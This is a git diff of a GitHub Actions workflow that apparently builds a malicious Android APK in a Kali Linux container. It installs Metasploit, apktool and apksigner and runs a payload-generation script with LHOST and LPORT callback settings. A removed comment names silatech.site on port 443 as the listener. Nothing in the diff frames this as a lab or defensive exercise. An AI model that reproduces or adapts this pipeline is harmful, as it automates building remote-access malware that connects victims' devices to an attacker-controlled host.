@@ -8,19 +8,24 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
+    
+    container:
+      image: kalilinux/kali-rolling:latest
 
     steps:
-    - uses: actions/checkout@v4
+    - name: Checkout
+      uses: actions/checkout@v4
 
-    - name: Install Toolchain
+    - name: Update & Install Tools
       run: |
-        sudo apt update
-        sudo apt install -y metasploit-framework apktool default-jdk apksigner zip
+        apt-get update -y
+        apt-get install -y metasploit-framework apktool default-jdk apksigner zip wget git
+        apt-get install -y android-sdk --fix-missing || true
 
-    - name: Generate Payload
+    - name: Generate APK
       env:
-        LHOST: ${{ secrets.LHOST }}    # silatech.site
-        LPORT: ${{ secrets.LPORT }}    # 443
+        LHOST: ${{ secrets.LHOST }}
+        LPORT: ${{ secrets.LPORT }}
       run: |
         chmod +x scripts/generate.sh
         ./scripts/generate.sh
